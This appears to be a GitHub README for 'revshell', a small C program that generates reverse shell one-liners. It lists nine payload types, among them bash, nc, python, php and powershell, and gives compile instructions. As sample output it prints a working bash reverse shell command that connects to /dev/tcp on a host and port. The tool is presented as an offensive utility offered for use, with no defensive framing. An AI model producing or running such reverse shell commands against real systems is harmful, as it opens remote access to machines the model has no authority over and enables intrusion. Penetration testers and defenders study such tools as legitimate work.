# revshell
Reverse shell generator with simple one-line commands.

## Usage

```
▶ ./revshell

    Produced by Nosferatuvjr, feel free to use it, but please credit me.
                            v0.1

Usage: revshell.c <host> <port> <number of payload

Payload list:
1. bash
2. nc
3. rm /tmp/f
4. python
5. php
6. perl
7. ruby
8. powershell
9. zsh

```

```
▶ ./revshell 192.168.0.1 1234 1

- bash -i >& /dev/tcp/192.168.0.1/1234 0>&1
```

## Compile

Compile it yourself or use pre-compiled binary from releases section.

```
gcc revshell.c -o revshell
```
### Fale comigo em :
<p align="left">
  <a href="https://github.com/Nosferatuvjr" target="_blank"><img src="https://img.shields.io/badge/Github-Nosferatuvjr-green?style=for-the-badge&logo=github"></a>
  <a href="https://www.instagram.com/vivald0x6f" target="_blank"><img src="https://img.shields.io/badge/IG-%40vivald0x6f-red?style=for-the-badge&logo=instagram"></a>
</p>
